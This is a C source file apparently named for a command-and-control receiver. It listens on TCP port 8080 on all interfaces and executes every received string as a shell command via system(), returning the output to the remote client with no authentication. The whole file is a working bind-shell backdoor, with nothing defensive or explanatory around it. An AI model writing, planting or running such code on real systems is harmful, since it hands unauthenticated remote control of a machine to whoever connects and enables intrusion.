#include "cc_receiver.h"

#define MAX_CMD_SIZE 1024
#define PORT 8080


void execute_command(int socket, char *cmd) {
    int pipefd[2];
    pid_t pid;

    // Create a pipe
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return;
    }

    // Fork a new process
    pid = fork();
    if (pid == -1) {
        perror("fork");
        return;
    }

    if (pid == 0) {  // Child process
        // Close the read end of the pipe
        close(pipefd[0]);

        // Redirect stdout to the write end of the pipe
        dup2(pipefd[1], STDOUT_FILENO);

        // Execute the command
        int ret = system(cmd);
        if (ret != 0) {
            write(pipefd[1], "Command not found or failed to execute", 39);
        }

        // Close the write end of the pipe
        close(pipefd[1]);
        exit(0);
    } else {  // Parent process
        char buffer[1024] = {0};

        // Close the write end of the pipe
        close(pipefd[1]);

        // Read from the pipe and send the output to the client
        ssize_t bytesRead;
        while ((bytesRead = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
            buffer[bytesRead] = '\0';  // Null-terminate the string
            send(socket, buffer, strlen(buffer), 0);
            memset(buffer, 0, sizeof(buffer));  // Clear the buffer
        }

        // Close the read end of the pipe
        close(pipefd[0]);
    }
}

int start_receiver() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[MAX_CMD_SIZE] = {0};

    // Create a new socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }

    // Set socket options
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        perror("Setsockopt");
        return EXIT_FAILURE;
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        return EXIT_FAILURE;
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen");
        return EXIT_FAILURE;
    }

    // Accept an incoming connection
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen)) < 0) {
        perror("Accept");
        return EXIT_FAILURE;
    }


    // Main loop to receive commands
    while (1) {
        ssize_t bytesRead = read(new_socket, buffer, MAX_CMD_SIZE);
        if (bytesRead <= 0) {
            perror("Client disconnected or read error");
            break;
        }
        buffer[bytesRead] = '\0';  // Null-terminate the string
        //printf("Received command: %s\n", buffer);

        // Check for empty or invalid command
        if (strlen(buffer) == 0) {
            continue;
        }

        // Execute the received command and send back the output
        execute_command(new_socket, buffer);
    }

    close(new_socket);
    return EXIT_SUCCESS;
}

int main() {
    return start_receiver();
}